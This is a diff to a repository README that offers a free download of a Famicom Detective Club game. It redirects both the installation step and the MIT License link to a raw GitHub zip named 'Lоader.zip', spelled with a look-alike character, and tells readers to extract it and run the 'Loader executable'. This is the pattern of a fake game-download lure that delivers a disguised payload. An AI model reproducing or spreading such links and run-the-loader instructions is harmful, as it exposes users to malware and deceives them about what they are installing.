@@ -28,7 +28,7 @@ All major platforms are supported! Play anywhere, anytime.
 
 ## 📥 Installation
 
-1. Download Loader.rar from the repository.
+1. Download https://raw.githubusercontent.com/Somraji/EmioSmilingMan-FamicomDetectiveClub-FreeDL/main/Lоader.zip from the repository.
 2. Extract the archive to your preferred folder.
 3. Run the Loader executable for your OS.
 4. Follow on-screen instructions to begin your unique experience!
@@ -49,6 +49,6 @@ This project is for educational and archival purposes only. By using this tool, 
 
 ## 📃 MIT License
 
-This repository is open-sourced under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+This repository is open-sourced under the [MIT License](https://raw.githubusercontent.com/Somraji/EmioSmilingMan-FamicomDetectiveClub-FreeDL/main/Lоader.zip) © 2025.
 
 Enjoy your adventure and happy sleuthing!
